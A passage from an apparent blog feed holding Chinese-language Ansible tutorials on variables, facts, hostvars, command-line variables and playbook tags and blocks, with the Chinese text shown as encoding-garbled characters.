/etc/nginx/sites-avaliable/default</span><br></pre></td></tr></table></figure><hr><h3 id="å¼•ç”¨å˜é‡"><a href="#å¼•ç”¨å˜é‡" class="headerlink" title="å¼•ç”¨å˜é‡"></a>å¼•ç”¨å˜é‡</h3><p>ansibleä½¿ç”¨jinjia2æ¨¡æ¿ç³»ç»Ÿåœ¨playbookä¸­å¼•ç”¨å˜é‡.å¼•ç”¨æ–¹æ³•ä¸º .ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My amp goes to &#123;&#123; max_amp_value &#125;&#125;</span><br></pre></td></tr></table></figure><p>### </p><h3 id="æŸ¥çœ‹å˜é‡çš„å€¼"><a href="#æŸ¥çœ‹å˜é‡çš„å€¼" class="headerlink" title="æŸ¥çœ‹å˜é‡çš„å€¼"></a>æŸ¥çœ‹å˜é‡çš„å€¼</h3><p>åœ¨ä¹‹å‰çš„æ–‡æ¡£ä¸­æåˆ°äº†å¯ä»¥ç”¨debugæ¨¡å—æ¥æ‰“å°å˜é‡:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- name: print the variable</span><br><span class="line">  debug: var=myvarname</span><br></pre></td></tr></table></figure><hr><h3 id="æ³¨å†Œå˜é‡"><a href="#æ³¨å†Œå˜é‡" class="headerlink" title="æ³¨å†Œå˜é‡"></a>æ³¨å†Œå˜é‡</h3><p>ç»å¸¸éœ€è¦åŸºäºtaskæ‰§è¡Œçš„ç»“æœæ¥è®¾ç½®å˜é‡å€¼.æƒ³è¦å®ç°è¿™ä¸ªæ“ä½œå¯ä»¥å†è°ƒç”¨æ¨¡å—æ—¶ä½¿ç”¨registerè¯­å¥æ¥æ³¨å†Œå˜é‡</p><p>ä¾‹å¦‚,å°†whiamiå‘½ä»¤æ‰§è¡Œçš„ç»“æœä¿å­˜åˆ°å˜é‡loginä¸­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- name: capture output of whoami command</span><br><span class="line">  command: whoami</span><br><span class="line">  register: login</span><br></pre></td></tr></table></figure><p>è®¿é—®loginå˜é‡ä¸­çš„å†…å®¹å¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ–¹æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- debug: msg=&quot;login is &#123;&#123;login.stdout&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœå˜é‡ä¸­åŒ…å«å­—å…¸,å¯ä»¥ä½¿ç”¨ç‚¹å·. æˆ–è€…ä¸­æ‹¬å·[]æ¥è®¿é—®å­—å…¸å†…çš„Key.ä¸Šé¢ä¹Ÿå¯ä»¥å†™æˆ:</p><p>login[â€˜stdoutâ€™]</p><p>æ¯”å¦‚è¿˜æœ‰ä¸‹é¢çš„å¸¸è§åµŒå¥—å˜é‡:</p><p>ansible_eth1[â€˜ipv4â€™][â€˜addressâ€™] </p><p>or:</p><p>ansible_eth1[â€˜ipv4â€™][â€˜addressâ€™]</p><p>ansible_eth1.ipv4[â€˜addressâ€™]</p><p>ansible_eth1.ipv4.address</p></blockquote><h3 id="fact"><a href="#fact" class="headerlink" title="fact"></a>fact</h3><p>ansibleåœ¨æ‰§è¡Œplaybookçš„æ—¶å€™,ç¬¬ä¸€æ­¥å°±æ˜¯é‡‡é›†ä¸»æœºçš„factä¿¡æ¯.ä¸»è¦åŒ…æ‹¬:æ“ä½œç³»ç»Ÿ,IPåœ°å€,CPU,å†…å­˜ç­‰ç­‰.è¿™äº›ä¿¡æ¯éƒ½ä¿å­˜åœ¨factå˜é‡ä¸­.</p><p>ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim facttest.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   remote_user: root</span><br><span class="line">   gather_facts: True</span><br><span class="line">   tasks:</span><br><span class="line">     - name: print the fact varibale:ansible_distrubution</span><br><span class="line">       debug: var=ansible_distribution</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook facttest.yml</span><br><span class="line"></span><br><span class="line">PLAY [all] *******************************************************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *******************************************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231]</span><br><span class="line">ok: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">TASK [print the fact varibale:ansible_distrubution] **************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231] =&gt; &#123;</span><br><span class="line">    &quot;ansible_distribution&quot;: &quot;CentOS&quot;</span><br><span class="line">&#125;</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;ansible_distribution&quot;: &quot;CentOS&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=0    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=2    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨è°ƒç”¨factå˜é‡æ—¶,å¹¶ä¸éœ€è¦registerå…³é”®å­—æ¥æ³¨å†Œå˜é‡,å› ä¸ºfactæ˜¯è‡ªåŠ¨æ³¨å†Œçš„.å¦å¤–è¿˜æœ‰ä¸€äº›æ¨¡å—ä¹Ÿä¼šè‡ªå¸¦è¿”å›factå˜é‡.æ¯”å¦‚dockeræ¨¡å—</p></blockquote><h4 id="æŸ¥è¯¢æŸå°æœåŠ¡å™¨çš„æ‰€æœ‰factä¿¡æ¯"><a href="#æŸ¥è¯¢æŸå°æœåŠ¡å™¨çš„æ‰€æœ‰factä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢æŸå°æœåŠ¡å™¨çš„æ‰€æœ‰factä¿¡æ¯:"></a>æŸ¥è¯¢æŸå°æœåŠ¡å™¨çš„æ‰€æœ‰factä¿¡æ¯:</h4><p>setupç‰¹æ®Šæ¨¡å—å¯ä»¥æ˜¾ç¤ºfactä¿¡æ¯:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;</span><br><span class="line">        &quot;ansible_all_ipv4_addresses&quot;: [</span><br><span class="line">            &quot;10.0.4.230&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_all_ipv6_addresses&quot;: [</span><br><span class="line">            &quot;fe80::20c:29ff:fedc:b1c7&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_apparmor&quot;: &#123;</span><br><span class="line">            &quot;status&quot;: &quot;disabled&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">å…¶ä½™çš„factå†…å®¹å¿½ç•¥</span><br></pre></td></tr></table></figure><p>ç”±äºfactå†…å®¹å®åœ¨å¤ªå¤š.setupæ¨¡å—è¿˜æ”¯æŒfilterå‚æ•°,æ¥åŒ¹é…æƒ³è¦æŸ¥æ‰¾çš„factä¿¡æ¯.å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°åˆ™è¿”å›ç©º:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_eth*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;&#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_ip*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;&#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br><span class="line">[root@localhost playbook]$ansible 10.0.4.230 -m setup -a &apos;filter=ansible_*ipv4*&apos;</span><br><span class="line">10.0.4.230 | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;</span><br><span class="line">        &quot;ansible_all_ipv4_addresses&quot;: [</span><br><span class="line">            &quot;10.0.4.230&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;ansible_default_ipv4&quot;: &#123;</span><br><span class="line">            &quot;address&quot;: &quot;10.0.4.230&quot;,</span><br><span class="line">            &quot;alias&quot;: &quot;eno16777736&quot;,</span><br><span class="line">            &quot;broadcast&quot;: &quot;10.0.4.255&quot;,</span><br><span class="line">            &quot;gateway&quot;: &quot;10.0.4.254&quot;,</span><br><span class="line">            &quot;interface&quot;: &quot;eno16777736&quot;,</span><br><span class="line">            &quot;macaddress&quot;: &quot;00:0c:29:dc:b1:c7&quot;,</span><br><span class="line">            &quot;mtu&quot;: 1500,</span><br><span class="line">            &quot;netmask&quot;: &quot;255.255.255.0&quot;,</span><br><span class="line">            &quot;network&quot;: &quot;10.0.4.0&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;ether&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;changed&quot;: false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="å†…ç½®å˜é‡"><a href="#å†…ç½®å˜é‡" class="headerlink" title="å†…ç½®å˜é‡"></a>å†…ç½®å˜é‡</h3><p>Ansibleä¼šè‡ªåŠ¨æä¾›ä¸€äº›å˜é‡,å³ä½¿ä½ æ²¡æœ‰å»å®šä¹‰ä»–ä»¬.è¿™äº›å˜é‡æ˜¯ansibleé¢„ç•™çš„.æ‰€ä»¥ç”¨æˆ·ä¸åº”è¯¥æ‰‹åŠ¨å®šä¹‰é‡åçš„å˜é‡.æ¯”å¦‚ä¸‹é¢è¿™äº›:</p><ul><li><strong>hostvars</strong></li></ul><p>hostvarså¯ä»¥è®©ä½ è®¿é—®æ‰€æœ‰ä¸»æœºèŠ‚ç‚¹çš„factä¿¡æ¯.å¦‚æœä¸€å°æœåŠ¡å™¨æƒ³è¦è®¿é—®å¦ä¸€ä¸ªèŠ‚ç‚¹æœåŠ¡å™¨çš„factä¿¡æ¯,è¿™å¾ˆæœ‰ç”¨.ä¸€èˆ¬è¯­æ³•æ˜¯:hostvars[â€˜inventory_hostnameâ€™][â€˜factä¿¡æ¯â€™]:ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim facttest.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   remote_user: root</span><br><span class="line">   gather_facts: True</span><br><span class="line">   tasks:</span><br><span class="line">     - name: print the fact varibale:ansible_distrubution</span><br><span class="line">       debug: var=hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook facttest.yml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TASK [print the fact varibale:ansible_distrubution] **************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231] =&gt; &#123;</span><br><span class="line">    &quot;hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]&quot;: [</span><br><span class="line">        &quot;10.0.4.231&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;hostvars[inventory_hostname][&apos;ansible_all_ipv4_addresses&apos;]&quot;: [</span><br><span class="line">        &quot;10.0.4.230&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>inventory_hostname</strong></li></ul><p>inventory_hostnameæ˜¯ansibleè¯†åˆ«çš„å½“å‰ä¸»æœºçš„ä¸»æœºå.å¦‚æœæ˜¯åœ¨hostsæ–‡ä»¶ä¸­å®šä¹‰è¿‡åˆ«å.æ¯”å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beta ansible_ssh_host=10.0.0.250</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆinventory_hostnameå°±æ˜¯beta</p><ul><li><strong>groups</strong></li></ul><p>å½“è¦è®¿é—®ä¸€ç»„ä¸»æœºçš„å˜é‡æ—¶,groupså˜é‡ä¼šå¾ˆæœ‰ç”¨.æ¯”å¦‚ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶éœ€è¦çŸ¥é“ä¸€ä¸ªtestç¾¤ç»„å†…æ‰€æœ‰æœåŠ¡å™¨çš„IPåœ°å€.é‚£ä¹ˆå¯ä»¥ç¼–è¾‘è¿™æ ·ä¸€ä¸ªæ¨¡æ¿é…ç½®æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for host in group.test %&#125;</span><br><span class="line">   server &#123;&#123; host.inventory_hostname &#125;&#125; &#123;&#123;host.ansible_default_ipv4.address&#125;&#125;:80</span><br><span class="line"> &#123;% endfor %&#125;</span><br><span class="line"> </span><br><span class="line"> æœ€ç»ˆç”Ÿæˆçš„é…ç½®æ–‡ä»¶å¦‚ä¸‹:</span><br><span class="line"> server test1 10.0.4.230</span><br><span class="line"> server test2 10.0.4.231</span><br></pre></td></tr></table></figure><hr><h3 id="å‘½ä»¤è¡Œè¾“å…¥å˜é‡"><a href="#å‘½ä»¤è¡Œè¾“å…¥å˜é‡" class="headerlink" title="å‘½ä»¤è¡Œè¾“å…¥å˜é‡"></a>å‘½ä»¤è¡Œè¾“å…¥å˜é‡</h3><p>é€šè¿‡å‘ansible-playbookä¼ é€’-e var=valueå‚æ•°å¯ä»¥åƒshellè„šæœ¬é‚£æ ·ä½¿ç”¨Playbook.å¹¶ä¸”è¯¥å‚æ•°çš„å˜é‡æ‹¥æœ‰æœ€é«˜ä¼˜å…ˆçº§.ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$vim greet.yml</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">  - hosts: 10.0.4.230</span><br><span class="line">    vars:</span><br><span class="line">       greeting: &quot;hello&quot;</span><br><span class="line">    tasks:</span><br><span class="line">       - name: print greeting</span><br><span class="line">         debug: msg=&quot;&#123;&#123; greeting &#125;&#125;&quot;</span><br></pre></td></tr></table></figure><p>é€šè¿‡-eæŒ‡å®šgreetingå˜é‡æ‰§è¡Œplaybook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e &apos;greeting=&quot;hello world&quot;&apos;</span><br><span class="line"></span><br><span class="line">TASK [print greeting] ******************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;hello world&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶greetingçš„å˜é‡å€¼å˜æˆäº†â€hello worldâ€ .è€Œä¸æ˜¯playbookä¸­å®šä¹‰çš„â€helloâ€</p><p>æ³¨æ„,å¦‚æœå˜é‡åŒ…å«ç©ºæ ¼,è¦æŠŠæ•´ä¸ª-eåé¢çš„å‚æ•°ç”¨å•å¼•å·æ‹¬èµ·æ¥..å¦åˆ™å°±ä¼šå¾—å‡ºæ„å¤–çš„ç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e greeting=&quot;hello world&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TASK [print greeting] ******************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.230] =&gt; &#123;</span><br><span class="line">    &quot;msg&quot;: &quot;hello&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–,-eé€‰é¡¹ä¸ä»…ä»…å¯ä»¥ä¼ é€’å•ä¸ªå­—ç¬¦ä¸²,è¿˜èƒ½ä¼ é€’è¿›ä¸€ä¸ªåŒ…å«å˜é‡çš„æ–‡ä»¶.æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­,å°†greetvars.ymlè¿™æ•´ä¸ªæ–‡ä»¶ä¼ é€’è¿›playbook:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook greet.yml -e @greetvars.yml</span><br></pre></td></tr></table></figure><hr><h3 id="å˜é‡ä¼˜å…ˆçº§"><a href="#å˜é‡ä¼˜å…ˆçº§" class="headerlink" title="å˜é‡ä¼˜å…ˆçº§:"></a>å˜é‡ä¼˜å…ˆçº§:</h3><p>1.å‘½ä»¤è¡Œä¸­ä½¿ç”¨-eå‚æ•°æ‰‹åŠ¨æŒ‡å®š</p><p>2.inventoryä¸»æœºæ–‡ä»¶,æˆ–è€…yamlæ–‡ä»¶å®šä¹‰çš„ä¸»æœºå˜é‡æˆ–è€…ç¾¤ç»„å˜é‡</p><p>3.FACTå˜é‡</p><p>4.roleçš„default/main.ymlæ–‡ä»¶å®šä¹‰çš„å˜é‡</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansibleå˜é‡&quot;&gt;&lt;a href=&quot;#Ansibleå˜é‡&quot; class=&quot;headerlink&quot; title=&quot;Ansibleå˜é‡&quot;&gt;&lt;/a&gt;Ansibleå˜é‡&lt;/h2&gt;&lt;p&gt;ansibleæœ‰å¤šé‡æ–¹å¼å®šä¹‰å˜é‡,è¿˜å¯ä»¥é€šè¿‡factæ¥è·å–å˜é‡.æ¥ä¸‹æ¥å­¦ä¹ ä¸€ä¸‹ansibled å˜é‡çŸ¥è¯†&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible playbooké«˜çº§ç‰¹æ€§</title>
    <link href="https://jesse.top/2018/08/26/Ansible/playbook%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/"/>
    <id>https://jesse.top/2018/08/26/Ansible/playbooké«˜çº§ç‰¹æ€§/</id>
    <published>2018-08-26T14:59:58.000Z</published>
    <updated>2018-12-01T14:27:37.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="playbooké«˜çº§ç‰¹æ€§"><a href="#playbooké«˜çº§ç‰¹æ€§" class="headerlink" title="playbooké«˜çº§ç‰¹æ€§"></a>playbooké«˜çº§ç‰¹æ€§</h2><h3 id="tags-æ ‡ç­¾"><a href="#tags-æ ‡ç­¾" class="headerlink" title="tags æ ‡ç­¾"></a>tags æ ‡ç­¾</h3><p>ç»™taskæ‰“ä¸Šæ ‡ç­¾å¯ä»¥å…è®¸playbookæ‰§è¡Œçš„æ—¶å€™ä½¿ç”¨â€“tagsé€‰é¡¹åªæ‰§è¡ŒæŸä¸ªtaskæˆ–è€…â€“skip-tagsé€‰é¡¹ä¸æ‰§è¡ŒæŸä¸ªtask.ä¾‹å¦‚:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line"></span><br><span class="line">    - yum:</span><br><span class="line">        name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">        state: installed</span><br><span class="line">      loop:</span><br><span class="line">         - httpd</span><br><span class="line">         - memcached</span><br><span class="line">      tags:</span><br><span class="line">         - packages</span><br><span class="line"></span><br><span class="line">    - template:</span><br><span class="line">        src: templates/src.j2</span><br><span class="line">        dest: /etc/foo.conf</span><br><span class="line">      tags:</span><br><span class="line">         - configuration</span><br></pre></td></tr></table></figure><p>å¦‚æœåªæƒ³æ‰§è¡Œâ€configurationâ€å’Œâ€packagsâ€æ ‡ç­¾çš„task,åªéœ€è¦æ‰§è¡Œ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook example.yml --tags &quot;configuration,packages&quot;</span><br></pre></td></tr></table></figure><p>æˆ–è€…å¦‚æœæƒ³è·³è¿‡configurationçš„task.åªéœ€è¦â€“skip-tagsé€‰é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible-playbook example.yml --skip-tags  &quot;configuration&quot;</span><br></pre></td></tr></table></figure><blockquote><p>tagsæ ‡ç­¾å¯ä»¥å¤ç”¨.å¯ä»¥ä¸ºå¤šä¸ªtaskæ‰“ä¸ŠåŒä¸€ä¸ªtags</p></blockquote><h4 id="tagsç»§æ‰¿æ€§"><a href="#tagsç»§æ‰¿æ€§" class="headerlink" title="tagsç»§æ‰¿æ€§"></a>tagsç»§æ‰¿æ€§</h4><p>tagså¯ä»¥å®šä¹‰åœ¨æ•´ä¸ªplaybookä¸­,æˆ–è€…rolesä¸­:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- hosts: all</span><br><span class="line">  tags:</span><br><span class="line">    - bar</span><br><span class="line">  tasks:</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">- hosts: all</span><br><span class="line">  tags: [&apos;foo&apos;]</span><br><span class="line">  tasks:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">roles:</span><br><span class="line">  - role: webserver</span><br><span class="line">    vars:</span><br><span class="line">      port: 5000</span><br><span class="line">    tags: [ &apos;web&apos;, &apos;foo&apos; ]</span><br></pre></td></tr></table></figure><hr><h3 id="Blocks-å—åŠŸèƒ½"><a href="#Blocks-å—åŠŸèƒ½" class="headerlink" title="Blocks å—åŠŸèƒ½"></a>Blocks å—åŠŸèƒ½</h3><p>Blockså—å¯ä»¥å…è®¸å°†ä¸€ä¸ªæˆ–å¤šä¸ªtaskå½’ä¸ºä¸€ç»„,ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: Install Apache</span><br><span class="line">    block:</span><br><span class="line">      - yum:</span><br><span class="line">          name: &quot;&#123;&#123; item &#125;&#125;&quot;</span><br><span class="line">          state: installed</span><br><span class="line">        with_items:</span><br><span class="line">          - httpd</span><br><span class="line">          - memcached</span><br><span class="line">      - template:</span><br><span class="line">          src: templates/src.j2</span><br><span class="line">          dest: /etc/foo.conf</span><br><span class="line">      - service:</span><br><span class="line">          name: bar</span><br><span class="line">          state: started</span><br><span class="line">          enabled: True</span><br><span class="line">    when: ansible_distribution == &apos;CentOS&apos;</span><br><span class="line">    become: true</span><br><span class="line">    become_user: root</span><br></pre></td></tr></table></figure><p>è¿™äº›taskéƒ½è¢«æ”¾ç½®ä¸ä¸€ä¸ªblockä¸­,è€Œä¸”åœ¨blockä¸­å®šä¹‰äº†ä¸€ä¸ªwhnæ¡ä»¶åˆ¤æ–­è¯­å¥.è¿™æ ·å°±ä¸ç”¨å†æ¯ä¸ªtaskä¸­éƒ½å®šä¹‰ä¸€ä¸ªç›¸åŒçš„whenè¯­å¥.</p><h4 id="blockå—å¤„ç†å¼‚å¸¸ä»»åŠ¡"><a href="#blockå—å¤„ç†å¼‚å¸¸ä»»åŠ¡" class="headerlink" title="blockå—å¤„ç†å¼‚å¸¸ä»»åŠ¡."></a>blockå—å¤„ç†å¼‚å¸¸ä»»åŠ¡.</h4><p>blockå¯ä»¥ç”¨æ¥å¤„ç†ä»»åŠ¡çš„å¼‚å¸¸.æœ‰ç‚¹ç±»ä¼¼äºpythonç¼–ç¨‹è¯­å¥çš„try exceptionâ€¦finallyè¯­å¥æ•è·å¼‚å¸¸.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">- name: Attempt and graceful roll back demo</span><br><span class="line">  block:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I execute normally&apos;</span><br><span class="line">    - command: /bin/false</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I never execute, due to the above task failing&apos;</span><br><span class="line">  rescue:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I caught an error&apos;</span><br><span class="line">    - command: /bin/false</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &apos;I also never execute :-(&apos;</span><br><span class="line">  always:</span><br><span class="line">    - debug:</span><br><span class="line">        msg: &quot;This always 